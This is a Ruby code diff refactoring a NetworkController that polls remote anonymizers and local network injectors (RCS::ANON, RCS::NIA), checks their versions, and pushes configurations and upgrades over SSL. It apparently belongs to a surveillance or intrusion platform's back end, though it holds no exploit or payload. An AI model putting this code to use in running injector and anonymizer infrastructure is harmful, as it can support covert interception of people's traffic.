@@ -20,22 +20,22 @@ class NetworkController
   extend RCS::Tracer
 
   # the minimum requested version of a component in order to work
-  MIN_VERSION = 2011033101
+  MIN_VERSION = 2011032101
   
   def self.check
 
     # retrieve the lists from the db
-    elements = DB.proxies
-    elements += DB.collectors
+    elements = DB.instance.proxies
+    elements += DB.instance.collectors
 
     # use one thread for each element
     threads = []
 
     # keep only the remote anonymizers discarding the local collectors
-    elements.delete_if {|x| x['type'] == 'LOCAL'}
+    elements.delete_if {|x| x['type'] == 'local'}
 
     # keep only the elements to be polled
-    elements.delete_if {|x| x['poll'] == 0}
+    elements.delete_if {|x| x['poll'] == false}
 
     if not elements.empty? then
       trace :info, "[NC] Handling #{elements.length} network elements..."
@@ -54,14 +54,14 @@ class NetworkController
         begin
           # three quarters of the interval check is a good compromise for timeout
           # we are sure that the operations will be finished before the next check
-          Timeout::timeout(Config.global['NC_INTERVAL'] * 0.75) do
+          Timeout::timeout(Config.instance.global['NC_INTERVAL'] * 0.75) do
             status, logs = check_element p
           end
         rescue Exception => e
           trace :debug, "[NC] #{p['address']} #{e.message}"
           #trace :debug, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
           # report the failing reason
-          report_status(p, 'KO', e.message)
+          report_status(p, 'ERROR', e.message)
         end
 
         # send the status to db
@@ -71,8 +71,8 @@ class NetworkController
 
         # send the logs to db
         logs.each do |log|
-          DB.proxy_add_log(p['proxy_id'], *log) unless p['proxy_id'].nil?
-          DB.collector_add_log(p['collector_id'], *log) unless p['collector_id'].nil?
+          DB.instance.injector_add_log(p['_id'], *log) if p['type'].nil?
+          DB.instance.collector_add_log(p['_id'], *log) unless p['type'].nil?
         end
         
         # make sure to destroy the thread after the check
@@ -96,7 +96,7 @@ class NetworkController
 
     # ssl encryption stuff
     ssl_context = OpenSSL::SSL::SSLContext.new()
-    ssl_context.cert = OpenSSL::X509::Certificate.new(File.read(Config.file('DB_CERT')))
+    ssl_context.cert = OpenSSL::X509::Certificate.new(File.read(Config.instance.file('DB_CERT')))
     #ssl_context.key = OpenSSL::PKey::RSA.new(File.open("keys/MyCompanyClient.key"))
     ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
     ssl_socket.sync_close = true
@@ -109,7 +109,7 @@ class NetworkController
     proto = NCProto.new(ssl_socket)
 
     # authenticate with the component
-    raise 'Cannot authenticate' unless proto.login(DB.network_signature)
+    raise 'Cannot authenticate' unless proto.login(DB.instance.network_signature)
 
     result = []
     logs = []
@@ -123,8 +123,8 @@ class NetworkController
           trace :info, "[NC] #{element['address']} is version #{ver}"
 
           # update the db accordingly
-          DB.update_proxy_version(element['proxy_id'], ver) unless element['proxy_id'].nil?
-          DB.update_collector_version(element['collector_id'], ver) unless element['collector_id'].nil?
+          DB.instance.update_injector_version(element['_id'], ver) if element['type'].nil?
+          DB.instance.update_collector_version(element['_id'], ver) unless element['type'].nil?
 
           # version check for incompatibility
           raise "Version too old, please update the component." if ver.to_i < MIN_VERSION
@@ -134,17 +134,26 @@ class NetworkController
 
         when NCProto::PROTO_CONF
           content = nil
-          if element['status'] == NCProto::COMPONENT_NEED_CONFIG then
-            content = DB.proxy_config(element['proxy_id']) unless element['proxy_id'].nil?
-            content = DB.collector_config(element['collector_id']) unless element['collector_id'].nil?
-            trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)"
+          if not element['configured']
+            content = DB.instance.injector_config(element['_id']) if element['type'].nil?
+            content = DB.instance.collector_config(element['_id']) unless element['type'].nil?
+            trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)" unless content.nil?
           end
           proto.config(content)
+
+        when NCProto::PROTO_UPGRADE
+          content = nil
+          if element['upgradable']
+            content = DB.instance.injector_upgrade(element['_id']) if element['type'].nil?
+            content = DB.instance.collector_upgrade(element['_id']) unless element['type'].nil?
+            trace :info, "[NC] #{element['address']} has a new upgrade (#{content.length} bytes)" unless content.nil?
+          end
+          proto.upgrade(content)
 
         when NCProto::PROTO_LOG
           time, type, desc = proto.log
           # we have to be fast here, we cannot insert them directly in the db
-          # since it will take too much time and we have to finishe before the timeout
+          # since it will take too much time and we have to finish before the timeout
           # return the array and let the caller insert them
           logs << [time, type, desc]
 
@@ -165,21 +174,22 @@ class NetworkController
   # having to wait for the next heartbeat
   def self.push(host, content)
     # retrieve the lists from the db
-    elements = DB.proxies
-    elements += DB.collectors
+    elements = DB.instance.proxies
+    elements += DB.instance.collectors
 
     # keep only the selected host
     elements.delete_if {|x| x['address'] != host}
     element = elements.first
 
-    trace :info, "[NC] PUSHING to #{element['address']}"
+    trace :info, "[NC] PUSHING to #{element['address']}:#{element['port']}"
 
     begin
       # contact the element
-      status = check_element element
+      status, logs = check_element element
       # send the results to db
       report_status(element, *status) unless status.nil? or status.empty?
     rescue Exception => e
+      trace :warn, "[NC] CANNOT PUSH TO #{element['address']}: #{e.message}"
       return e.message, "text/html"
     end
 
@@ -188,11 +198,13 @@ class NetworkController
 
 
   def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0)
-    if not elem['proxy_id'].nil? then
-      component = "RCS::IPA::" + elem['proxy']
-    end
-    if not elem['collector_id'].nil? then
-      component = "RCS::ANON::" + elem['collector']
+
+    if elem['type'] == 'remote' then
+      component = "RCS::ANON::" + elem['name']
+      internal_component = 'anonymizer'
+    else
+      component = "RCS::NIA::" + elem['name']
+      internal_component = 'injector'
     end
 
     trace :info, "[NC] [#{component}] #{elem['address']} #{status}"
@@ -201,7 +213,7 @@ class NetworkController
     stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
 
     # send the status to the db
-    DB.update_status component, elem['address'], status, message, stats
+    DB.instance.update_status component, elem['address'], status, message, stats, internal_component
   end
 
   
@@ -211,16 +223,16 @@ class NetworkController
     ip = ''
 
     # report our status
-    status = Status.my_status
-    disk = Status.disk_free
-    cpu = Status.cpu_load
-    pcpu = Status.my_cpu_load
+    status = SystemStatus.my_status
+    disk = SystemStatus.disk_free
+    cpu = SystemStatus.cpu_load
+    pcpu = SystemStatus.my_cpu_load(component)
 
     # create the stats hash
     stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
 
     # send the status to the db
-    DB.update_status component, ip, status, message, stats
+    DB.instance.update_status component, ip, status, message, stats, 'nc'
   end
 
 end
